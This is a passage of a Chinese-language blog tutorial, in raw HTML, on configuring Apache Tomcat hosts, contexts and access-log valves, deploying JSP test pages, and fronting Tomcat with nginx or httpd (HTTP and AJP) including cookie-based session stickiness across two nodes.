class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]# vim /etc/tomcat/server.xml</span><br><span class="line">&lt;Engine&gt;</span><br><span class="line">  ...</span><br><span class="line">  &lt;Host name=&quot;node1.fenghong.tech&quot; appBase=&quot;/web/apps&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;/&gt;</span><br><span class="line">&lt;/Engine&gt;</span><br><span class="line">[root@node1 ~]# mkdir -pv /web/apps/ROOT/</span><br><span class="line">[root@node1 ~]# vim /web/apps/ROOT/index.jsp</span><br><span class="line">&lt;%@ page language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;&lt;title&gt;TomcatA&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;&lt;font color=&quot;red&quot;&gt;TomcatA.fenghong.tech&lt;/font&gt;&lt;/h1&gt;</span><br><span class="line">        &lt;table align=&quot;centre&quot; border=&quot;1&quot;&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;Session ID&lt;/td&gt;</span><br><span class="line">            &lt;% session.setAttribute(&quot;fenghong.tech&quot;,&quot;fenghong.tech&quot;); %&gt;</span><br><span class="line">                &lt;td&gt;&lt;%= session.getId() %&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;Created on&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;&lt;%= session.getCreationTime() %&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">        &lt;/table&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">[root@node1 ~]# systemctl restart tomcat</span><br><span class="line">测试访问：http://node1.fenghong.tech:8080/</span><br></pre></td></tr></table></figure><ul><li>配置示例：Context组件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]# vim /etc/tomcat/server.xml</span><br><span class="line">&lt;Engine&gt;</span><br><span class="line">  ...</span><br><span class="line">    &lt;Host name=&quot;node1.fenghong.tech&quot; appBase=&quot;/web/apps&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt;</span><br><span class="line">      &lt;Context path=&quot;/testapp&quot; docBase=&quot;/web/testapp&quot; reloadable=&quot;&quot;/&gt;</span><br><span class="line">    &lt;/Host&gt;</span><br><span class="line">&lt;/Engine&gt;</span><br><span class="line">[root@node1 ~]# systemctl restart tomcat</span><br><span class="line">[root@node1 ~]# mkdir -pv /web/testapp/ROOT</span><br><span class="line">[root@node1 ~]# vim /web/testapp/index.jsp</span><br><span class="line">...</span><br><span class="line">测试访问：http://node1.fenghong.tech:8080/testapp/</span><br></pre></td></tr></table></figure><ul><li>配置示例：Valve组件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]# vim /etc/tomcat/server.xml</span><br><span class="line">&lt;Host name=&quot;node1.fenghong.tech&quot; appBase=&quot;/web/apps&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt;</span><br><span class="line">  &lt;Context path=&quot;/testapp&quot; docBase=&quot;/web/testapp&quot; reloadable=&quot;&quot;&gt;</span><br><span class="line">    &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot;</span><br><span class="line">      prefix=&quot;node1_test_access_&quot; suffix=&quot;.log&quot;</span><br><span class="line">      pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt;</span><br><span class="line">  &lt;/Context&gt;</span><br><span class="line">&lt;/Host&gt;</span><br><span class="line">[root@node1 ~]# systemctl restart tomcat</span><br><span class="line">[root@node1 ~]# tail /var/log/tomcat/node1_test_access_2018-07-17.log</span><br><span class="line">192.168.0.8 - - [17/Jul/2018:22:59:30 +0800] &quot;GET /testapp/ HTTP/1.1&quot; 200 334</span><br></pre></td></tr></table></figure><h3 id="JSP-WebAPP的组织结构："><a href="#JSP-WebAPP的组织结构：" class="headerlink" title="JSP WebAPP的组织结构："></a>JSP WebAPP的组织结构：</h3><ul><li>index.jsp：主页；</li><li>WEB-INF/：当前webapp的私有资源路径；通常用于存储当前webapp的web.xml和context.xml配置文件；</li><li>META-INF/：类似于WEB-INF/；</li><li>classes/：类文件，当前webapp所提供的类；</li><li>lib/：类文件，当前webapp所提供的类，被打包为jar格式；</li></ul><h3 id="webapp归档格式："><a href="#webapp归档格式：" class="headerlink" title="webapp归档格式："></a>webapp归档格式：</h3><ul><li>.war：webapp</li><li>.jar：EJB的类打包文件；</li><li>.rar：资源适配器类打包文件；</li><li>.ear：企业级webapp；</li></ul><h1 id="部署-deploy-webapp"><a href="#部署-deploy-webapp" class="headerlink" title="部署(deploy)webapp"></a>部署(deploy)webapp</h1><ul><li>deploy：将webapp的源文件放置于目标目录(网页程序文件存放目录)，配置tomcat服务器能够基于web.xml和context.xml文件中定义的路径来访问此webapp；将其特有的类和依赖的类通过class loader装载至JVM；</li><li>undeploy：反部署，停止webapp，并从tomcat实例上卸载webapp；</li><li>start：启动处于停止状态的webapp；</li><li>stop：停止webapp，不再向用户提供服务；其类依然在jvm上；</li><li>redeploy：重新部署；</li></ul><p>部署可分为自动部署和手动部署；手动部署又有冷部署和热部署：</p><ul><li>冷部署：把webapp复制到指定的位置，而后才启动tomcat；</li><li>热部署：在不停止tomcat的前提下进行部署；部署工具有manager、ant脚本、tcd(tomcat client deployer)等；</li></ul><p>示例：手动提供一测试类应用，并冷部署</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]# mkdir -pv /var/lib/tomcat/webapps/test/&#123;classes,lib,WEB-INF&#125;</span><br><span class="line">[root@node1 ~]# vim /var/lib/tomcat/webapps/test/index.jsp</span><br><span class="line">&lt;%@ page language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.*&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Test Page&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;% out.println(&quot;hello world&quot;);</span><br><span class="line">        %&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">访问：http://192.168.0.10:8080/test/</span><br></pre></td></tr></table></figure><h1 id="NT：nginx-httpd-tomcat"><a href="#NT：nginx-httpd-tomcat" class="headerlink" title="NT：nginx | httpd + tomcat"></a>NT：nginx | httpd + tomcat</h1><p><img src="/images/tomcat-nt.png" alt="img"> </p><h2 id="nginx和Tomcat通过http-https协议工作"><a href="#nginx和Tomcat通过http-https协议工作" class="headerlink" title="nginx和Tomcat通过http/https协议工作"></a>nginx和Tomcat通过http/https协议工作</h2><p>配置Tomcat：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">[root@tomcat ~]# mkdir -pv /data/webapp/ROOT/</span><br><span class="line">[root@tomcat ~]# vim /data/webapp/ROOT/index.jsp  #提供jsp测试页</span><br><span class="line">&lt;%@ page language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;&lt;title&gt;TomcatA&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;&lt;font color=&quot;red&quot;&gt;TomcatA.fenghong.tech&lt;/font&gt;&lt;/h1&gt;</span><br><span class="line">        &lt;table align=&quot;centre&quot; border=&quot;1&quot;&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;Session ID&lt;/td&gt;</span><br><span class="line">            &lt;% session.setAttribute(&quot;fenghong.tech&quot;,&quot;fenghong.tech&quot;); %&gt;</span><br><span class="line">                &lt;td&gt;&lt;%= session.getId() %&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;Created on&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;&lt;%= session.getCreationTime() %&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">        &lt;/table&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">[root@tomcat ~]# vim /data/webapp/ROOT/test.html  #提供静态测试页</span><br><span class="line">static page</span><br><span class="line">[root@tomcat ~]# vim /etc/tomcat/server.xml  #修改Tomcat配置，如下</span><br><span class="line">&lt;?xml version=&apos;1.0&apos; encoding=&apos;utf-8&apos;?&gt;</span><br><span class="line">&lt;Server port=&quot;-1&quot; shutdown=&quot;SHUTDOWN&quot;&gt;</span><br><span class="line">  &lt;Listener className=&quot;org.apache.catalina.startup.VersionLoggerListener&quot; /&gt;</span><br><span class="line">  &lt;Listener className=&quot;org.apache.catalina.core.AprLifecycleListener&quot; SSLEngine=&quot;on&quot; /&gt;</span><br><span class="line">  &lt;Listener className=&quot;org.apache.catalina.core.JasperListener&quot; /&gt;</span><br><span class="line">  &lt;Listener className=&quot;org.apache.catalina.core.JreMemoryLeakPreventionListener&quot; /&gt;</span><br><span class="line">  &lt;Listener className=&quot;org.apache.catalina.mbeans.GlobalResourcesLifecycleListener&quot; /&gt;</span><br><span class="line">  &lt;Listener className=&quot;org.apache.catalina.core.ThreadLocalLeakPreventionListener&quot; /&gt;</span><br><span class="line">  &lt;GlobalNamingResources&gt;</span><br><span class="line">    &lt;Resource name=&quot;UserDatabase&quot; auth=&quot;Container&quot;</span><br><span class="line">              type=&quot;org.apache.catalina.UserDatabase&quot;</span><br><span class="line">              description=&quot;User database that can be updated and saved&quot;</span><br><span class="line">              factory=&quot;org.apache.catalina.users.MemoryUserDatabaseFactory&quot;</span><br><span class="line">              pathname=&quot;conf/tomcat-users.xml&quot; /&gt;</span><br><span class="line">  &lt;/GlobalNamingResources&gt;</span><br><span class="line">  &lt;Service name=&quot;Catalina&quot;&gt;</span><br><span class="line">    &lt;Connector address=&quot;127.0.0.1&quot; port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;</span><br><span class="line">               connectionTimeout=&quot;20000&quot;</span><br><span class="line">               redirectPort=&quot;8443&quot; /&gt;</span><br><span class="line">    &lt;!-- &lt;Connector address=&quot;127.0.0.1&quot; port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt; --&gt;</span><br><span class="line">    &lt;Engine name=&quot;Catalina&quot; defaultHost=&quot;node1.fenghong.tech&quot;&gt;</span><br><span class="line">      &lt;Realm className=&quot;org.apache.catalina.realm.LockOutRealm&quot;&gt;</span><br><span class="line">        &lt;Realm className=&quot;org.apache.catalina.realm.UserDatabaseRealm&quot;</span><br><span class="line">               resourceName=&quot;UserDatabase&quot;/&gt;</span><br><span class="line">      &lt;/Realm&gt;</span><br><span class="line">      &lt;Host name=&quot;localhost&quot;  appBase=&quot;webapps&quot;</span><br><span class="line">            unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt;</span><br><span class="line">        &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot;</span><br><span class="line">               prefix=&quot;localhost_access_log.&quot; suffix=&quot;.txt&quot;</span><br><span class="line">               pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt;</span><br><span class="line">      &lt;/Host&gt;</span><br><span class="line">      &lt;Host name=&quot;node1.fenghong.tech&quot; appBase=&quot;/data/webapp&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt;</span><br><span class="line">        &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot;</span><br><span class="line">               prefix=&quot;node1-dongfei-tech_access.&quot; suffix=&quot;.log&quot;</span><br><span class="line">               pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt;</span><br><span class="line">          &lt;/Host&gt;</span><br><span class="line">    &lt;/Engine&gt;</span><br><span class="line">  &lt;/Service&gt;</span><br><span class="line">&lt;/Server&gt;</span><br><span class="line">[root@tomcat ~]# systemctl start tomcat</span><br></pre></td></tr></table></figure><p>配置nginx：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@tomcat ~]# vim /etc/nginx/conf.d/nginx_tomcat.conf</span><br><span class="line">server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        server_name node1.fenghong.tech;</span><br><span class="line">        index index.jsp index.html;</span><br><span class="line">        location / &#123;</span><br><span class="line">                root &quot;/data/webapp/ROOT/&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        location ~* \.(jsp|do)$ &#123;</span><br><span class="line">                proxy_pass http://127.0.0.1:8080;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">[root@tomcat ~]# nginx</span><br></pre></td></tr></table></figure><blockquote><p>测试访问：</p><ul><li><a href="http://node1.fenghong.tech/" target="_blank" rel="noopener">http://node1.fenghong.tech/</a></li><li><a href="http://node1.fenghong.tech/test.html" target="_blank" rel="noopener">http://node1.fenghong.tech/test.html</a></li></ul></blockquote><h2 id="httpd和Tomcat通过http-https协议工作"><a href="#httpd和Tomcat通过http-https协议工作" class="headerlink" title="httpd和Tomcat通过http/https协议工作"></a>httpd和Tomcat通过http/https协议工作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@tomcat ~]# httpd -M |grep proxy</span><br><span class="line"> proxy_module (shared) #代理模块</span><br><span class="line"> proxy_ajp_module (shared) #适配ajp协议客户端</span><br><span class="line"> proxy_balancer_module (shared)</span><br><span class="line"> proxy_connect_module (shared)</span><br><span class="line"> proxy_express_module (shared)</span><br><span class="line"> proxy_fcgi_module (shared)</span><br><span class="line"> proxy_fdpass_module (shared)</span><br><span class="line"> proxy_ftp_module (shared)</span><br><span class="line"> proxy_http_module (shared) #适配http协议客户端</span><br><span class="line"> proxy_scgi_module (shared)</span><br><span class="line"> proxy_wstunnel_module (shared)</span><br></pre></td></tr></table></figure><p>配置Tomcat：如上</p><p>配置httpd：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@tomcat ~]# vim /etc/httpd/conf.d/http_tomcat.conf</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerName node1.fenghong.tech</span><br><span class="line">    ProxyRequests Off  #关闭正向代理</span><br><span class="line">    ProxyVia On</span><br><span class="line">    ProxyPreserveHost On  #将请求头HOST发送给后端主机</span><br><span class="line">    &lt;Proxy *&gt;</span><br><span class="line">        Require all granted</span><br><span class="line">    &lt;/Proxy&gt;</span><br><span class="line">    ProxyPass / http://127.0.0.1:8080/</span><br><span class="line">    &lt;Location /&gt;</span><br><span class="line">        Require all granted</span><br><span class="line">    &lt;/Location&gt;</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line">[root@tomcat ~]# systemctl start httpd</span><br></pre></td></tr></table></figure><h2 id="http和Tomcat通过ajp协议工作"><a href="#http和Tomcat通过ajp协议工作" class="headerlink" title="http和Tomcat通过ajp协议工作"></a>http和Tomcat通过ajp协议工作</h2><p>配置Tomcat：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@tomcat ~]# vim /etc/tomcat/server.xml</span><br><span class="line">&lt;Connector address=&quot;127.0.0.1&quot; port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt;</span><br><span class="line">[root@tomcat ~]# systemctl restart tomcat</span><br></pre></td></tr></table></figure><p>配置httpd：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@tomcat ~]# vim /etc/httpd/conf.d/http_tomcat.conf</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        ServerName node1.fenghong.tech</span><br><span class="line">        ProxyRequests Off</span><br><span class="line">        ProxyVia On</span><br><span class="line">        ProxyPreserveHost On</span><br><span class="line">        &lt;Proxy *&gt;</span><br><span class="line">                Require all granted</span><br><span class="line">        &lt;/Proxy&gt;</span><br><span class="line">        ProxyPass / ajp://127.0.0.1:8009/</span><br><span class="line">        &lt;Location /&gt;</span><br><span class="line">                Require all granted</span><br><span class="line">        &lt;/Location&gt;</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line">[root@tomcat ~]# systemctl restart httpd</span><br></pre></td></tr></table></figure><h1 id="nntm的会话保持实现"><a href="#nntm的会话保持实现" class="headerlink" title="nntm的会话保持实现"></a>nntm的会话保持实现</h1><ul><li><p>session sticky：会话绑定</p><ul><li>source_ip：基于源地址做会话绑定；nginx: ip_hash，haproxy: source，lvs: sh</li><li>cookie：基于cookie做会话绑定；nginx：hash，haproxy: cookie</li></ul></li></ul><p><img src="/images/nntm.png" alt="img"> </p><h2 id="httpd-nginx-tomcat-cluster：基于cookie实现会话绑定"><a href="#httpd-nginx-tomcat-cluster：基于cookie实现会话绑定" class="headerlink" title="httpd + nginx + tomcat cluster：基于cookie实现会话绑定"></a>httpd + nginx + tomcat cluster：基于cookie实现会话绑定</h2><p>前端httpd调度器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[root@Director ~]# httpd -M |grep balancer</span><br><span class="line"> proxy_balancer_module (shared)</span><br><span class="line">[root@Director ~]# vim /etc/httpd/conf.d/httpd-tomcat.conf</span><br><span class="line">Header add Set-Cookie &quot;ROUTEID=.%&#123;BALANCER_WORKER_ROUTE&#125;e; path=/&quot; env=BALANCER_ROUTE_CHANGED</span><br><span class="line">&lt;proxy balancer://tcsrvs&gt;</span><br><span class="line">    BalancerMember http://192.168.0.10:80 route=TomcatA loadfactor=1</span><br><span class="line">    BalancerMember http://192.168.0.11:80 route=TomcatB loadfactor=2</span><br><span class="line">    ProxySet lbmethod=byrequests</span><br><span class="line">    ProxySet stickysession=ROUTEID</span><br><span class="line">&lt;/Proxy&gt;</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerName www.fenghong.tech</span><br><span class="line">    ProxyVia On </span><br><span class="line">    ProxyRequests Off</span><br><span class="line">    ProxyPreserveHost On</span><br><span class="line">    &lt;Proxy *&gt;   </span><br><span class="line">        Require all granted </span><br><span class="line">    &lt;/Proxy&gt;    </span><br><span class="line">    ProxyPass / balancer://tcsrvs/</span><br><span class="line">    ProxyPassReverse / balancer://tcsrvs/</span><br><span class="line">    &lt;Location /&gt;</span><br><span class="line">        Require all granted </span><br><span class="line">    &lt;/Location&gt; </span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line">[root@Director ~]# systemctl start httpd</span><br></pre></td></tr></table></figure><p>tomcat-node-1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">[root@tomcat-node-1 ~]# vim /etc/nginx/conf.d/nginx_tomcat.conf </span><br><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server;</span><br><span class="line">    server_name node1.fenghong.tech;</span><br><span class="line">    index index.jsp index.html;</span><br><span class="line">    location / &#123;</span><br><span class="line">        root &quot;/data/webapp/ROOT/&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    location ~* \.(jsp|do)$ &#123;</span><br><span class="line">        proxy_pass http://127.0.0.1:8080;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">[root@tomcat-node-1 ~]# vim /etc/tomcat/server.xml</span><br><span class="line">&lt;Server port=&quot;-1&quot; shutdown=&quot;SHUTDOWN&quot;&gt;</span><br><span class="line">  &lt;Service name=&quot;Catalina&quot;&gt;</span><br><span class="line">    &lt;Connector address=&quot;127.0.0.1&quot; port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;</span><br><span class="line">               connectionTimeout=&quot;20000&quot;</span><br><span class="line">               redirectPort=&quot;8443&quot; /&gt;</span><br><span class="line">    &lt;Engine name=&quot;Catalina&quot; defaultHost=&quot;node1.fenghong.tech&quot; jvmRoute=&quot;TomcatA&quot;&gt;</span><br><span class="line">      &lt;Host name=&quot;node1.fenghong.tech&quot; appBase=&quot;/data/webapp&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt;</span><br><span class="line">        &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot;</span><br><span class="line">               prefix=&quot;node1-dongfei-tech_access.&quot; suffix=&quot;.log&quot;</span><br><span class="line">               pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt;</span><br><span class="line">          &lt;/Host&gt;</span><br><span class="line">    &lt;/Engine&gt;</span><br><span class="line">  &lt;/Service&gt;</span><br><span class="line">&lt;/Server&gt;</span><br><span class="line">[root@tomcat-node-1 ~]# vim /data/webapp/ROOT/index.jsp</span><br><span class="line">&lt;%@ page language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;&lt;title&gt;TomcatA&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;&lt;font color=&quot;red&quot;&gt;TomcatA.fenghong.tech&lt;/font&gt;&lt;/h1&gt;</span><br><span class="line">        &lt;table align=&quot;centre&quot; border=&quot;1&quot;&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;Session ID&lt;/td&gt;</span><br><span class="line">            &lt;% session.setAttribute(&quot;fenghong.tech&quot;,&quot;fenghong.tech&quot;); %&gt;</span><br><span class="line">                &lt;td&gt;&lt;%= session.getId() %&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;Created on&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;&lt;%= session.getCreationTime() %&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">        &lt;/table&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">[root@tomcat-node-1 ~]# systemctl start nginx tomcat</span><br></pre></td></tr></table></figure><p>tomcat-node-2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">[root@tomcat-node-2 ~]# vim /etc/nginx/conf.d/nginx_tomcat.conf</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server;</span><br><span class="line">    server_name node2.fenghong.tech;</span><br><span class="line">    index index.jsp index.html;</span><br><span class="line">    location / &#123;</span><br><span class="line">        root &quot;/data/webapp/ROOT/&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    location ~* \.(jsp|do)$ &#123;</span><br><span class="line">        proxy_pass http://127.0.0.1:8080;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">[root@tomcat-node-2 ~]# vim /etc/tomcat/server.xml</span><br><span class="line">&lt;Server port=&quot;-1&quot; shutdown=&quot;SHUTDOWN&quot;&gt;</span><br><span class="line">  &lt;Service name=&quot;Catalina&quot;&gt;</span><br><span class="line">    &lt;Connector address=&quot;127.0.0.1&quot; port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;</span><br><span class="line">               connectionTimeout=&quot;20000&quot;</span><br><span class="line">               redirectPort=&quot;8443&quot; 